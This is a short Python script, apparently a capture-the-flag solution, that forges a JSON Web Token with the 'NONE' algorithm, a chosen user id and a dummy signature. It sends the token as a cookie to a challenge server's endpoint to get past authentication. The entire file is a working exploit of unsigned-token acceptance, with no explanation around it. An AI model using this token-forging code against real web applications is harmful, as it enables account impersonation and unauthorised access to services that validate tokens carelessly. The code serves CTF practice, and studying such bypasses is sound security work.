# import jwt
import requests
import json
import base64
def base64url_encode(value):
    return base64.urlsafe_b64encode(value).rstrip(b"=")
header = {"typ": "JWT", "alg": 'NONE'}
payload = {"id": 1337, "username": 'ngoc', "year": 1337}



b64header = base64url_encode(json.dumps (header).encode())
b64payload= base64url_encode(json.dumps (payload).encode())

token = b".".join([b64header, b64payload, base64url_encode(b"swag_in_ohio")]).decode()
print (f"{token=}\n")

r = requests.get("https://back-to-the-future.tjc.tf/retro", cookies={"token": token})
print(r.text)